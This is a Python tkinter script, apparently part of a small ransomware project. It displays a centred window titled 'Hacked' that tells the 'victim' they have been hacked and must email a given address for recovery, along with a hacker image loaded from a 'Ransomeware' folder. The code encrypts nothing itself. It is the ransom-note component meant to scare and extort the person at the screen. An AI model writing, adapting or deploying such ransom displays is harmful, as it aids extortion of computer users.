from tkinter import *
from PIL import ImageTk
from PIL import Image

#Create the window
root = Tk()
root.title("Hacked")

#Height and width of app
window_h = 1000
window_w = 500

#find height/width of victums screen
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

x = (screen_width / 2) - (window_h / 2)
y = (screen_height / 2) - (window_w /2)

#place the window on screen
root.geometry(f"{window_h}x{window_w}+{int(x)}+{int(y)}")

#fill with stuff
my_lable = Label(root, text=f"You have been hacked! Send a email jacksonmissippi369@gmail.com to for recovery")
my_lable.pack(pady=90)

#define img, make varable, add img to screen
img = Image.open("/home/malware/Documents/Ransomeware/hacker.png")
img_resize = img.resize((300,300),Image.ANTIALIAS)
img_new = ImageTk.PhotoImage(img_resize)
img_label = Label(image=img_new)
img_label.pack()

root.mainloop()


